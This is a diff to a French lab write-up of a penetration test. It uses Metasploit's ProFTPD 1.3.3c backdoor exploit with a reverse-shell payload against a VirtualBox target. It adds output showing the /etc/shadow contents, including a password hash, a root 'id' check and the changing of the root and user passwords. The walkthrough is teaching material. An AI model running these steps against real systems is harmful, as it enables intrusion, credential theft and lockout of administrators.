@@ -25,6 +25,7 @@ netdiscover -i eth1 -r 192.168.56.0/24
 | 192.168.56.102| 08:00:27:7a:fa:4f    | 1     | 60  | PCS Systemtechnik GmbH    |
 
 **Nous voyons que la machine cible a pour adresse IP 192.168.56.102**
+*L'adresse 192.168.56.1 est l'adresse de notre machine hôte attribué par VirtualBox*
 
 ### 1.2. Découverte des services
 
@@ -99,7 +100,7 @@ use exploit/unix/ftp/proftpd_133c_backdoor
 set RHOST 192.168.56.102
 
 # On configure le payload utilisé
-set PAYLOAD set PAYLOAD cmd/unix/reverse
+set PAYLOAD cmd/unix/reverse
 
 # On configure l'adresse IP de notre machine pour la connexion en reverse
 set LHOST 192.168.56.103
@@ -121,13 +122,37 @@ run
 
 ```bash
 ls /home
+marlinspike
 # On peut voir que le dossier marlinspike existe
 
 ls /home/marlinspike
+046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz
+046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz.bak
+backdoored_proftpd-1.3.3c
+Desktop
+Documents
+Downloads
+examples.desktop
+latest.tar.gz
+Music
+Pictures
+proftpd-1.3.3c
+proftpd-1.3.3c.tar.bz2
+proftpd-1.3.3c.tar.bz2.bak
+Public
+Templates
+Videos
+wordpress
 # La commande liste bien les fichiers
 
 # nous pouvons également utiliser la commande cat pour lire le contenu des fichiers comme le fichier /etc/shadow qui nécessite des droits root pour être lu.
 cat /etc/shadow
+root:!:17484:0:99999:7:::
+[...]
+marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
+mysql:!:17486:0:99999:7:::
+sshd:*:17486:0:99999:7:::
+
 # La commande affiche bien le contenu du fichier
 ```
 
@@ -140,11 +165,10 @@ cat /etc/shadow
 
 ```bash
 id
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
 ```
 
-*uid=0(root) gid=0(root) groups=0(root),65534(nogroup)*
-
-***Ce qui signifie que nous sommes root et que nous usuperons l'identité du compte administrateur.***
+***Ce qui signifie que nous sommes root et que nous usurpons l'identité du compte administrateur.***
 
 ### 3.3. Atteinte de l'objectif 3
 *Rappel: L'attaquant peut-il bloquer l'accès a l'administrateur ?*
@@ -153,9 +177,15 @@ id
 
 ```bash
 passwd root
+Enter new UNIX password: root
+Retype new UNIX password: root
+passwd: password updated successfully
 # On change le mot de passe du compte root
 
 passwd marlinspike
+Enter new UNIX password: marlinspike
+Retype new UNIX password: marlinspike
+passwd: password updated successfully
 # On change le mot de passe du compte marlinspike
 ```
 
